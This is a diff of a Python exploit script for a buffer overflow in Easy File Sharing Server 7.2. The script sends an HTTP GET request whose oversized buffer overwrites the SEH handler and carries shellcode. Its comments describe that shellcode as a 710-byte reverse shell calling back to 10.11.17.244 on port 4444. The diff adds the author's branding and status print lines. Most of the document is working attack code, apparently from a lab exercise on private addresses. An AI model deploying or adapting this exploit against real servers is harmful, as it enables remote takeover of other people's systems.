@@ -4,6 +4,16 @@ import sys
 
 host= "10.11.17.53"
 port= 80
+
+#[*]Target acquired ----> 10.11.17.53:80
+#
+#[*]Buffer Sent[*]
+#
+#This shell has been brought to you by Gr1zz1y
+
+#Easy File Sharing Server 7.2 // Tested on Vista Ultimate x86
+#No bad characters discovered
+#710 byte rev shell to 10.11.17.244 on port 4444/ encoded with x86/alpha_mixed
 shellcode=("\x89\xe2\xdb\xcd\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
 "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
 "\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
@@ -60,5 +70,8 @@ buffer= "A" * 4061 + island + seh + "\x90" * 4 + shellcode
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
+print "[*]Target acquired ----> " + host + " " + port
 s.send("GET " + buffer + " HTTP/1.0\r\n\r\n")
+print "[*]Buffer sent[*]"
 s.close() 
+print "This shell has been brought to you by Gr1zz1y"
